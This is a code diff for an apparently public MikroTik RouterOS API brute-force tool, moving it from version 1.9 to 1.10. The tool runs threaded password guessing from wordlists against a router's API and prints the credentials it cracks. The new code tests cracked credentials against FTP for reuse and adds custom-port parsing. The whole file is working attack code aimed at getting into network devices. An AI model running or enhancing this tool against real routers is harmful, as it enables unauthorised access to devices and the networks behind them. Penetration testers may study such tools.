@@ -1,9 +1,8 @@
-
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-_version = "1.9"
+_version = "1.10"
 
-import time, argparse, threading, concurrent.futures, socket
+import time, argparse, threading, concurrent.futures
 from datetime import datetime
 from pathlib import Path
 
@@ -21,7 +20,7 @@ def current_time():
     return datetime.now().strftime("%H:%M:%S")
 
 class Bruteforce:
-    def __init__(self, target, port, usernames, passwords, combo_dict, delay, use_ssl=False, max_workers=2, verbose=False, verbose_all=False, services_to_validate=None):
+    def __init__(self, target, port, usernames, passwords, combo_dict, delay, use_ssl=False, max_workers=2, verbose=False, verbose_all=False, validate_services=None):
         self.target = target
         self.port = port
         self.usernames = usernames
@@ -32,7 +31,7 @@ class Bruteforce:
         self.max_workers = min(max_workers, 15)
         self.verbose = verbose
         self.verbose_all = verbose_all
-        self.services_to_validate = services_to_validate or []
+        self.validate_services = validate_services or {}
         self.log = Log(verbose=verbose, verbose_all=verbose_all)
         self.wordlist = []
         self.successes = []
@@ -76,27 +75,12 @@ class Bruteforce:
                 else:
                     self.wordlist = [("admin", self.passwords)]
             else:
-                self.wordlist = [("admin", "")]  # fallback
-
+                self.wordlist = [("admin", "")]
         except Exception as e:
             self.log.error(f"Error loading wordlist: {e}")
             exit(1)
 
         self.wordlist = list(dict.fromkeys(self.wordlist))
-
-    def check_ftp(self):
-        try:
-            with socket.create_connection((self.target, 21), timeout=3) as s:
-                banner = s.recv(1024).decode(errors='ignore')
-                if 'ftp' in banner.lower():
-                    self.log.info("[*] FTP service detected and accessible.")
-                    return True
-                else:
-                    self.log.warning("[*] FTP port open but banner is unexpected.")
-                    return False
-        except Exception as e:
-            self.log.warning(f"[*] FTP service check failed: {e}")
-            return False
 
     def get_next_combo(self):
         with self.index_lock:
@@ -112,12 +96,14 @@ class Bruteforce:
             if combo is None:
                 break
             user, password = combo
+            if self.verbose_all:
+                self.log.debug(f"Trying -> {user}:{password}")
             try:
                 api = Api(self.target, self.port, use_ssl=self.use_ssl)
                 result = api.login(user, password)
                 if result:
                     with self.lock:
-                        self.successes.append((user, password))
+                        self.successes.append({"user": user, "pass": password, "services": ["api"]})
                     self.log.success(f"Current testing -> {user}:{password}")
                 elif self.verbose:
                     self.log.fail(f"Current testing -> {user}:{password}")
@@ -126,12 +112,33 @@ class Bruteforce:
                     self.log.warning(f"Error trying password '{password}': {e}")
             time.sleep(self.delay)
 
-    def run(self):
-        if "ftp" in self.services_to_validate:
-            self.log.info("[*] Validating service: FTP")
-            if not self.check_ftp():
-                self.log.warning("[*] FTP service is not available. Skipping FTP brute-force.")
+    def validate_extra_services(self):
+        from ftplib import FTP
 
+        for cred in self.successes:
+            user = cred["user"]
+            passwd = cred["pass"]
+            validated = []
+
+            if "ftp" in self.validate_services:
+                port = self.validate_services.get("ftp") or 21
+                try:
+                    if self.verbose_all:
+                        self.log.debug(f"Testing FTP for {user}:{passwd} on port {port}")
+                    ftp = FTP()
+                    ftp.connect(self.target, port, timeout=5)
+                    ftp.login(user, passwd)
+                    validated.append("ftp")
+                    ftp.quit()
+                except Exception as e:
+                    if self.verbose_all:
+                        self.log.debug(f"FTP validation failed for {user}:{passwd} on port {port} — {e}")
+
+
+            if validated:
+                cred["services"].extend(s for s in validated if s not in cred["services"])
+
+    def run(self):
         self.log.info("[*] Starting brute force attack...")
         self.log.info(f"[*] Total Attempts {len(self.wordlist)}...")
 
@@ -141,19 +148,27 @@ class Bruteforce:
 
         self.log.info("[*] Attack finished.\n")
 
+        if self.validate_services and self.successes:
+            for service in self.validate_services:
+                self.log.info(f"[+] Testing service validation for: {service.upper()}...")
+            self.validate_extra_services()
+
         if self.successes:
             print("\n## CREDENTIAL(S) EXPOSED ##")
-            deduped = list(dict.fromkeys(self.successes))
-            max_user = max(len(u) for u, _ in deduped)
-            max_pass = max(len(p) for _, p in deduped)
-            print(f"{'-'*4}+{'-'*(max_user+2)}+{'-'*(max_pass+2)}")
-            print(f"ORD | {'USERNAME':^{max_user}} | {'PASSWORD':^{max_pass}}")
-            print(f"{'-'*4}+{'-'*(max_user+2)}+{'-'*(max_pass+2)}")
-            for idx, (user, pwd) in enumerate(deduped, start=1):
-                print(f"{idx:03} | {user:^{max_user}} | {pwd:^{max_pass}}")
+            deduped = list({(d["user"], d["pass"]): d for d in self.successes}.values())
+            max_user = max(len(d["user"]) for d in deduped)
+            max_pass = max(len(d["pass"]) for d in deduped)
+            print(f"{'-'*4}+{'-'*(max_user+2)}+{'-'*(max_pass+2)}+{'-'*10}")
+            print(f"ORD | {'USERNAME':^{max_user}} | {'PASSWORD':^{max_pass}} | SERVICES")
+            print(f"{'-'*4}+{'-'*(max_user+2)}+{'-'*(max_pass+2)}+{'-'*10}")
+            for idx, d in enumerate(deduped, start=1):
+                services = ', '.join(d["services"])
+                print(f"{idx:03} | {d['user']:^{max_user}} | {d['pass']:^{max_pass}} | {services}")
             print("\nAttack completed successfully.\n")
         else:
             print("\nNo credentials were validated successfully with the given users and passwords.\n")
+
+# === MAIN EXECUTION ===
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Mikrotik API Brute Force Tool")
@@ -169,24 +184,26 @@ if __name__ == "__main__":
     parser.add_argument("--threads", type=int, default=2, help="Number of concurrent threads (default: 2, max: 15)")
     parser.add_argument("-v", "--verbose", action="store_true", help="Show failed and warning attempts")
     parser.add_argument("-vv", "--verbose-all", action="store_true", help="Show debug and error messages")
-    parser.add_argument("--validate", help="Comma-separated list of services to validate before attack (ftp,ssh,telnet,webfig)", type=str)
+    parser.add_argument("--validate", help="Comma-separated services or service=port (e.g., ftp,ssh=2222)")
+
     args = parser.parse_args()
+    Log.banner()
 
-    services_to_validate = [s.strip().lower() for s in args.validate.split(',')] if args.validate else []
+    def parse_validate_services(raw_input):
+        services = {}
+        if not raw_input:
+            return services
+        for item in raw_input.split(','):
+            item = item.strip()
+            if '=' in item:
+                name, port = item.split('=', 1)
+                if port.isdigit():
+                    services[name.lower()] = int(port)
+            else:
+                services[item.lower()] = None
+        return services
 
-    print(f"""
-         __  __ _ _              _   _ _        _    ____ ___      ____  _____
-        |  \/  (_) | ___ __ ___ | |_(_) | __   / \  |  _ \_ _|    | __ )|  ___|
-        | |\/| | | |/ / '__/ _ \| __| | |/ /  / _ \ | |_) | |_____|  _ \| |_
-        | |  | | |   <| | | (_) | |_| |   <  / ___ \|  __/| |_____| |_) |  _|
-        |_|  |_|_|_|\_\_|  \___/ \__|_|_|\_\/_/   \_\_|  |___|    |____/|_|
-
-                    Mikrotik RouterOS API Bruteforce Tool v{_version}
-                     André Henrique (X / Linkedin: @mrhenrike)
-            Please report tips, suggests and problems to X or LinkedIn
-                    https://github.com/mrhenrike/MikrotikAPI-BF
-    """)
-
+    service_ports = parse_validate_services(args.validate)
     usernames = args.userlist if args.userlist else args.user
     passwords = args.passlist if args.passlist else args.passw
 
@@ -201,7 +218,7 @@ if __name__ == "__main__":
         max_workers=args.threads,
         verbose=args.verbose,
         verbose_all=args.verbose_all,
-        services_to_validate=services_to_validate
+        validate_services=service_ports
     )
 
     try:
